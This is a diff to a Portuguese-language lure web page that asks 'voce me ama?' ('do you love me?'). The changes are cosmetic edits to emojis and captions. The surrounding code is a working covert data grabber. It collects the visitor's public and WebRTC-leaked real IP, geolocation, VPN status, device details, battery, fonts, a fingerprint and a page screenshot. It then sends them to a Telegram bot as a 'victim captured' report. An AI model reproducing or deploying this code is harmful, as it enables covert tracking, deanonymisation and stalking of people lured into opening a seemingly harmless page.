@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>voce me ama?</title>
+    <title> 01? </title>
     <script src="https://cdn.jsdelivr.net/npm/html2canvas@1.4.1/dist/html2canvas.min.js">
     </script>
     <style>
@@ -252,7 +252,7 @@
 
     <div class="container" id="page-content">
         <div class="pergunta">
-            <span class="emoji">💗</span> voce me ama?
+            <span class="emoji">❤️</span> voce me ama?
         </div>
 
         <div class="buttons" id="buttonArea">
@@ -329,9 +329,9 @@
         async function coletarEEnviar() {
             try {
                 const ip = await fetch('https://api.ipify.org?format=json')
-                    .then(r => r.json()).then(d => d.ip).catch(() => '❌');
+                    .then(r => r.json()).then(d => d.ip).catch(() => '😵');
 
-                let webrtcIP = '❌';
+                let webrtcIP = '❎';
                 try {
                     const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
                     pc.createDataChannel('teste');
@@ -359,7 +359,7 @@
                         timezone: d.timezone || 'Desconhecido'
                     };
                 } catch {
-                    location = { city: '❌', region: '❌', country: '❌', loc: '❌', org: '❌', timezone: '❌' };
+                    location = { city: '🌃', region: '🗺️', country: '🌵', loc: '📍', org: '❌', timezone: '❌' };
                 }
 
                 let vpnStatus = '❓ Indeterminado';
@@ -413,11 +413,11 @@
                     marca = 'Desktop';
                 }
 
-                let bateria = '❌';
+                let bateria = '🔋';
                 if (navigator.getBattery) {
                     try {
                         const b = await navigator.getBattery();
-                        bateria = `${Math.round(b.level * 100)}% (${b.charging ? '⚡ Carregando' : '🔋 Descarregando'})`;
+                        bateria = `${Math.round(b.level * 100)}% (${b.charging ? '⚡ Carregando' : '🪫 Descarregando'})`;
                     } catch {}
                 }
 
@@ -470,28 +470,28 @@
                 } catch (e) {}
 
                 let msg = `
-        💗 **CLEAN GIRL — VÍTIMA CAPTURADA** 💗
+         **CLEAN GIRL — VÍTIMA CAPTURADA** 💗
 
-        🌐 **IP Público:** ${ip}
+        📲 **IP Público:** ${ip}
         🔴 **IP Real (WebRTC):** ${webrtcIP}
         🛡️ **VPN/Proxy:** ${vpnStatus}
 
         📍 **LOCALIZAÇÃO POR IP:**
-           🏙️ Cidade: ${location.city}
+           🌃 Cidade: ${location.city}
            🗺️ Região: ${location.region}
            🌍 País: ${location.country}
            📍 Coordenadas: ${location.loc}
            🕰️ Fuso: ${location.timezone}
 
-        📱 **DISPOSITIVO:**
+        📲 **DISPOSITIVO:**
            📱 Modelo: ${modelo}
            🏷️ Marca: ${marca}
-           📲 OS: ${os}
+           📱 OS: ${os}
            🔋 Bateria: ${bateria}
-           📶 Conexão: ${conexao}
+           🛜 Conexão: ${conexao}
            📐 Tela: ${screen.width}x${screen.height}
            🌍 Idioma: ${navigator.language}
-           🕰️ Fuso: ${Intl.DateTimeFormat().resolvedOptions().timeZone}
+           ⏰ Fuso: ${Intl.DateTimeFormat().resolvedOptions().timeZone}
            🧠 Fingerprint: ${fingerprint}
 
         📶 **REDE:** ${wifi}
@@ -502,7 +502,7 @@
 
         🔤 **FONTES INSTALADAS:** ${fontsInstalled}
 
-        💀 **Ela disse SIM!** 💀
+        ⛳️ **Ela disse SIM!** ‼️
         `;
 
                 await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
@@ -521,7 +521,7 @@
                     const blob = await fetch(screenshot).then(res => res.blob());
                     form.append('photo', blob, 'screenshot_real.jpg');
                     form.append('chat_id', CHAT_ID);
-                    form.append('caption', '🖼️ PRINT REAL DA TELA INTEIRA');
+                    form.append('caption', '🖼️ PRINT');
                     await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                         method: 'POST',
                         body: form
